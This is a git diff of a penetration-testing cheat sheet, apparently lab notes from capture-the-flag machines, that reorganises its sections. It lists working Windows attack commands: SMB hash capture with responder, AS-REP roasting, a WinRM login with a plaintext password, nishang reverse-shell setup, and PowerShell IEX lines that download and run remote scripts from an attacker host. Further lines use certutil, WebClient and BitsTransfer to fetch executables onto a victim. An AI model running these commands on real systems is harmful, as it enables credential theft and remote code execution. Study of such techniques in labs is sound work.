@@ -68,32 +68,32 @@ smbclient -U anonymous  //10.10.10.130/batshare
 ```
 
 ## steal smbhash when having a shell
-### victim
-`responder -I tun0`
 ### attacker
+`responder -I tun0`
+### victim
 `get-content \\10.10.14.73\blablabla`
 ### get user hahses 
 `GetNPUsers.py DOMAIN/ -usersfile ausers.txt`
-
 `evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'`
 
-SHELLS
-```cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .```
-```psexec.py  'user:pass@localhost' cmd ```
+### SHELLS
+```
+cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+psexec.py  'user:pass@localhost' cmd 
+```
 
 ENUMERATION
 
 JAWS --> https://github.com/411Hall/JAWS.git
 
-DOWNLOAD SHELL POWERSHELL
-
+### DOWNLOAD SHELL POWERSHELL
 cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev1.ps1')  (may need to escape quotes)
 AVOID BAD CHARACTERS --> convert to windows file format
 iconv -t UTF-16LE | base64-w0 
 powershell 64 bit is stored in C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
 start-process -Filepath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/adm.txt')" -credential $cred
 
-DOWNLOAD FILE CMD/PS
+### DOWNLOAD FILE CMD/PS
 certutil -urlcache -split -f http://10.10.14.12/priv.exe C:\\users\\public\\agent.exe #CMD
 (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/priv.exe', 'C:/inetpub/wwwroot/1.exe') # PS
 Start-BitsTransfer -Source http://10.10.14.12/priv.exe -Destination 1.exe # PS
